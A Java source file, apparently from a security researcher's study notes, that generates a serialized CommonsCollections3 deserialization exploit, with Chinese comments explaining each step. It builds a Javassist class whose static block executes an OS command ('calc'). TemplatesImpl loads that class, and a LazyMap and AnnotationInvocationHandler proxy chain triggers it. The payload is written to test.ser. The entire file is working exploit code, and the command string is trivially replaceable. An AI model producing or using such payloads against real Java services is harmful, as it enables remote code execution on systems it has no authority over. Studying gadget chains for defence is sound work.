import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3 {

    public static void main(String[] args) throws Exception {
        /* 生成字节码 */
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath((AbstractTranslet.class)));
        CtClass cc = classPool.makeClass("Evil");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块
        cc.setName("Leihehe");
        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));//必须要继承AbstractTranslet类
        final byte[] classBytes = cc.toBytecode();//获取字节码
        /* TemplatesImpl加载字节码 */
        TemplatesImpl templates = TemplatesImpl.class.newInstance();//创建一个templates对象
        setFieldValue(templates,"_name","leihehe");
        setFieldValue(templates,"_class",null);
        setFieldValue(templates,"_bytecodes",new byte[][]{classBytes});
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());


        Class trAXFilterClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(trAXFilterClass),
                new InvokerTransformer("getConstructor",new Class[]{Class[].class},new Object[]{new Class[]{Templates.class}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class},new Object[] {new Object[]{templates}})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map,chainedTransformer);

        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        //创建代理类的实例
        InvocationHandler InvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
        //创建hashmap的动态代理instance，现在我们只需要call 到evilMap的任意function就可以触发代理类的invoke了
        Map testMap = new HashMap();
        Map evilMap = (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(),InvocationHandler);
        //创建第二个代理类的实例
        InvocationHandler anotherInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, evilMap);

        /* 写出序列化文件 */
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(("test.ser")));
        outputStream.writeObject(anotherInvocationHandler);
        outputStream.close();


    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
